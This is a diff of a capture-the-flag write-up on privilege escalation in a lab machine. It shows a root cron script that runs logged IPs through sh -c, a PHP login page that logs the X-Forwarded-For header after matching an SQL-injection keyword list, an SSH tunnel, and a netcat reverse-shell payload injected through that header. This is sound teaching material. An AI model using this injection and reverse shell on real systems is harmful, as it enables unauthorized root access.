@@ -26,20 +26,20 @@ kitty@kitty:~$
 
 ### Privelege Escalation
 + Upload linpeas and have an active port `8080`
-+ found weird file 
++ found weird file on `/opt` and after look using pspy64 it's running every minutes
 ```bash
 kitty@kitty:~$ cat /opt/log_checker.sh
 #!/bin/sh
 while read ip;
 do
-  /usr/bin/sh -c "echo $ip >> /root/logged";
+  /usr/bin/sh -c "echo $ip >> /root/logged"; 
 done < /var/www/development/logged
 cat /dev/null > /var/www/development/logged
 ```
 
-+ Check on `index.php` on development site 
-```bash
-kitty@kitty:/var/www/development$ cat index.php
++ Using `linpeas.sh` we got the file `VHOST 127.0.0.1:8080` and server linten on localhost 8080 check vhost file to abuse
++ Check on `index.php` on development site `/var/www/development`
+```php
 <?php
 // Initialize the session
 session_start();
@@ -58,9 +58,9 @@ $evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "
 foreach ($evilwords as $evilword) {
 	if (preg_match( $evilword, $username )) {
 		echo 'SQL Injection detected. This incident will be logged!';
-		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];   // THIS IS THE PAYLOAD TO INJECT
 		$ip .= "\n";
-		file_put_contents("/var/www/development/logged", $ip);
+		file_put_contents("/var/www/development/logged", $ip); // THE PAYLOAD WILL WRITE TO THIS FILE
 		die();
 	} elseif (preg_match( $evilword, $password )) {
 		echo 'SQL Injection detected. This incident will be logged!';
@@ -135,13 +135,11 @@ if(!empty($login_err)){
 ```
 
 + So we need to TUNNELING the local PORT (8080) `ssh -L 8080:127.0.0.1:8080 kitty@10.10.131.226`
-
++ Generate python script to get call on localhost (proxy) 
 ```bash
 kitty@kitty:/var/www/development$ tail -f logged
 $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 4444 >/tmp/f)
 ```
-
-
 
 + Generate new python request exploit the `X-Forwaded-For: payload`
 ```bash
